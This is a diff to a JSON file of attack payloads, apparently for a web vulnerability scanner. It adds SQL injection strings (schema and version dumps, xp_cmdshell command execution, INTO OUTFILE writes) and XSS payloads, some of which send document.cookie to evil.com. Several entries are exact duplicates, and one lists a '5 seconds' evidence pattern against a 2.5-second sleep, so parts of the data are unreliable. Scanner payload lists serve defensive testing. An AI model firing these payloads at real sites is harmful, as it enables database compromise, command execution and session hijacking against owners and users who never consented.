@@ -25,7 +25,7 @@
     },
     {
         "payload_id": "sqli3",
-        "payload": "' AND SLEEP(5)--",
+        "payload": "' AND SLEEP(2.5)--",
         "vuln_type": "SQLI",
         "severity": "MEDIUM",
         "match_type": "TIME_BASED",
@@ -97,7 +97,7 @@
     },
     {
         "payload_id": "sqli9",
-        "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(2.5)))a)--",
         "vuln_type": "SQLI",
         "severity": "MEDIUM",
         "match_type": "TIME_BASED",
@@ -118,6 +118,232 @@
             "PostgreSQL",
             "SQL Server",
             "version"
+        ]
+    },
+    {
+        "payload_id": "sqli11",
+        "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT version()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--",
+        "vuln_type": "SQLI",
+        "severity": "HIGH",
+        "match_type": "ERROR_BASED",
+        "evidence_patterns": [
+            "duplicate entry",
+            "floor",
+            "version",
+            "error"
+        ]
+    },
+    {
+        "payload_id": "sqli12",
+        "payload": "'; WAITFOR DELAY '00:00:05'--",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "TIME_BASED",
+        "evidence_patterns": [
+            "delay",
+            "5 seconds",
+            "timeout"
+        ]
+    },
+    {
+        "payload_id": "sqli13",
+        "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(2.5)))a) AND '1'='1",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "TIME_BASED",
+        "evidence_patterns": [
+            "sleep",
+            "delay"
+        ]
+    },
+    {
+        "payload_id": "sqli14",
+        "payload": "1'; EXEC xp_cmdshell('whoami')--",
+        "vuln_type": "SQLI",
+        "severity": "CRITICAL",
+        "match_type": "ERROR_BASED",
+        "evidence_patterns": [
+            "whoami",
+            "xp_cmdshell",
+            "command output"
+        ]
+    },
+    {
+        "payload_id": "sqli15",
+        "payload": "' OR 1=1 LIMIT 1--",
+        "vuln_type": "SQLI",
+        "severity": "HIGH",
+        "match_type": "BOOLEAN",
+        "evidence_patterns": [
+            "logged in",
+            "success",
+            "bypass"
+        ]
+    },
+    {
+        "payload_id": "sqli16",
+        "payload": "' UNION SELECT null, table_name, column_name FROM information_schema.columns WHERE table_name='users'--",
+        "vuln_type": "SQLI",
+        "severity": "CRITICAL",
+        "match_type": "UNION",
+        "evidence_patterns": [
+            "users",
+            "columns",
+            "schema"
+        ]
+    },
+    {
+        "payload_id": "sqli17",
+        "payload": "1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)=1--",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "BOOLEAN",
+        "evidence_patterns": [
+            "conditional",
+            "true"
+        ]
+    },
+    {
+        "payload_id": "sqli18",
+        "payload": "'; IF (1=1) WAITFOR DELAY '00:00:05' ELSE WAITFOR DELAY '00:00:00'--",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "TIME_BASED",
+        "evidence_patterns": [
+            "conditional delay"
+        ]
+    },
+    {
+        "payload_id": "sqli19",
+        "payload": "1' AND (SELECT COUNT(*) FROM users) > 10--",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "BOOLEAN",
+        "evidence_patterns": [
+            "true",
+            "false",
+            "users count"
+        ]
+    },
+    {
+        "payload_id": "sqli20",
+        "payload": "1' AND (SELECT * FROM (SELECT(SLEEP(2.5)))a) AND '1'='1",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "TIME_BASED",
+        "evidence_patterns": [
+            "sleep",
+            "5 seconds",
+            "delay"
+        ]
+    },
+    {
+        "payload_id": "sqli21",
+        "payload": "1' AND 1=0 UNION SELECT 1,2,3,4,5--",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "UNION",
+        "evidence_patterns": [
+            "2",
+            "3",
+            "4",
+            "5",
+            "union columns"
+        ]
+    },
+    {
+        "payload_id": "sqli22",
+        "payload": "' OR (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/(SELECT 0) END) = 1--",
+        "vuln_type": "SQLI",
+        "severity": "HIGH",
+        "match_type": "ERROR_BASED",
+        "evidence_patterns": [
+            "division by zero",
+            "error",
+            "conditional"
+        ]
+    },
+    {
+        "payload_id": "sqli23",
+        "payload": "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT user()), 0x3a, FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) y)--",
+        "vuln_type": "SQLI",
+        "severity": "HIGH",
+        "match_type": "ERROR_BASED",
+        "evidence_patterns": [
+            "duplicate entry",
+            "user",
+            "floor",
+            "error"
+        ]
+    },
+    {
+        "payload_id": "sqli24",
+        "payload": "'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER()'--",
+        "vuln_type": "SQLI",
+        "severity": "HIGH",
+        "match_type": "UNION",
+        "evidence_patterns": [
+            "user",
+            "execute immediate",
+            "dynamic"
+        ]
+    },
+    {
+        "payload_id": "sqli25",
+        "payload": "1' AND (SELECT 1 FROM (SELECT(SLEEP(2.5)))a) AND '1'='1",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "TIME_BASED",
+        "evidence_patterns": [
+            "sleep",
+            "delay"
+        ]
+    },
+    {
+        "payload_id": "sqli26",
+        "payload": "' UNION SELECT NULL, NULL, @@datadir, @@version_compile_os--",
+        "vuln_type": "SQLI",
+        "severity": "HIGH",
+        "match_type": "UNION",
+        "evidence_patterns": [
+            "datadir",
+            "compile_os",
+            "version",
+            "mysql"
+        ]
+    },
+    {
+        "payload_id": "sqli27",
+        "payload": "1' AND (SELECT 1 FROM (SELECT(SLEEP(2.5)))a) AND '1'='1",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "TIME_BASED",
+        "evidence_patterns": [
+            "sleep",
+            "delay"
+        ]
+    },
+    {
+        "payload_id": "sqli28",
+        "payload": "' OR 1=1 INTO OUTFILE '/tmp/out.txt'--",
+        "vuln_type": "SQLI",
+        "severity": "CRITICAL",
+        "match_type": "UNION",
+        "evidence_patterns": [
+            "outfile",
+            "tmp",
+            "write"
+        ]
+    },
+    {
+        "payload_id": "sqli29",
+        "payload": "1' AND (SELECT 1 FROM (SELECT(SLEEP(2.5)))a) AND '1'='1",
+        "vuln_type": "SQLI",
+        "severity": "MEDIUM",
+        "match_type": "TIME_BASED",
+        "evidence_patterns": [
+            "sleep",
+            "delay"
         ]
     },
     {
@@ -237,6 +463,235 @@
         "evidence_patterns": [
             "onfocus",
             "autofocus",
+            "alert"
+        ]
+    },
+    {
+        "payload_id": "xss11",
+        "payload": "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>",
+        "vuln_type": "XSS",
+        "severity": "CRITICAL",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "fetch",
+            "document.cookie",
+            "evil.com"
+        ]
+    },
+    {
+        "payload_id": "xss12",
+        "payload": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
+        "vuln_type": "XSS",
+        "severity": "HIGH",
+        "match_type": "POLYGLOT",
+        "evidence_patterns": [
+            "multiple contexts",
+            "alert",
+            "polyglot"
+        ]
+    },
+    {
+        "payload_id": "xss13",
+        "payload": "<details open ontoggle=alert(1)>",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "details",
+            "ontoggle",
+            "alert"
+        ]
+    },
+    {
+        "payload_id": "xss14",
+        "payload": "<svg><script>alert(1)</script>",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "svg",
+            "script",
+            "alert"
+        ]
+    },
+    {
+        "payload_id": "xss15",
+        "payload": "';alert(1);'",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "DOM_BASED",
+        "evidence_patterns": [
+            "alert",
+            "semicolon"
+        ]
+    },
+    {
+        "payload_id": "xss16",
+        "payload": "<a href=\"javascript:alert(1)\">click</a>",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "DOM_BASED",
+        "evidence_patterns": [
+            "javascript:",
+            "anchor",
+            "alert"
+        ]
+    },
+    {
+        "payload_id": "xss17",
+        "payload": "<math><mtext><malignmark></malignmark></mtext></math><img src=x onerror=alert(1)>",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "math",
+            "img",
+            "onerror"
+        ]
+    },
+    {
+        "payload_id": "xss18",
+        "payload": "<video><source onerror=alert(1)>",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "video",
+            "source",
+            "onerror"
+        ]
+    },
+    {
+        "payload_id": "xss19",
+        "payload": "';alert(String.fromCharCode(88,83,83))//",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "alert",
+            "char code"
+        ]
+    },
+    {
+        "payload_id": "xss20",
+        "payload": "<script>window.location='https://evil.com/?c='+btoa(document.cookie)</script>",
+        "vuln_type": "XSS",
+        "severity": "CRITICAL",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "btoa",
+            "document.cookie",
+            "evil.com",
+            "exfiltration"
+        ]
+    },
+    {
+        "payload_id": "xss21",
+        "payload": "<img src=x onerror=prompt(/XSS/)>",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "onerror",
+            "prompt",
+            "XSS"
+        ]
+    },
+    {
+        "payload_id": "xss22",
+        "payload": "<svg/onload=location.href='//evil.com/?c='+document.cookie>",
+        "vuln_type": "XSS",
+        "severity": "CRITICAL",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "location.href",
+            "document.cookie",
+            "evil.com"
+        ]
+    },
+    {
+        "payload_id": "xss23",
+        "payload": "\" onmouseover=\"alert(1)\" data-x=\"",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "POLYGLOT",
+        "evidence_patterns": [
+            "onmouseover",
+            "alert",
+            "attribute injection"
+        ]
+    },
+    {
+        "payload_id": "xss24",
+        "payload": "javascript:/*</script><svg onload=alert(1)>*/",
+        "vuln_type": "XSS",
+        "severity": "HIGH",
+        "match_type": "POLYGLOT",
+        "evidence_patterns": [
+            "multiple contexts",
+            "svg",
+            "onload",
+            "alert"
+        ]
+    },
+    {
+        "payload_id": "xss25",
+        "payload": "<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><input autofocus>",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "onscroll",
+            "autofocus",
+            "alert"
+        ]
+    },
+    {
+        "payload_id": "xss26",
+        "payload": "<math><mtext><malignmark></malignmark></mtext></math><img src=x onerror=alert(1)>",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "math",
+            "img",
+            "onerror"
+        ]
+    },
+    {
+        "payload_id": "xss27",
+        "payload": "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\\",
+        "vuln_type": "XSS",
+        "severity": "HIGH",
+        "match_type": "POLYGLOT",
+        "evidence_patterns": [
+            "multiple contexts",
+            "alert",
+            "char code"
+        ]
+    },
+    {
+        "payload_id": "xss28",
+        "payload": "<input type=\"text\" value=\"\" onfocus=alert(1) autofocus>",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "onfocus",
+            "autofocus",
+            "alert"
+        ]
+    },
+    {
+        "payload_id": "xss29",
+        "payload": "<script>eval(atob('YWxlcnQoMSk='))</script>",
+        "vuln_type": "XSS",
+        "severity": "MEDIUM",
+        "match_type": "REFLECTED",
+        "evidence_patterns": [
+            "eval",
+            "atob",
+            "base64",
             "alert"
         ]
     }
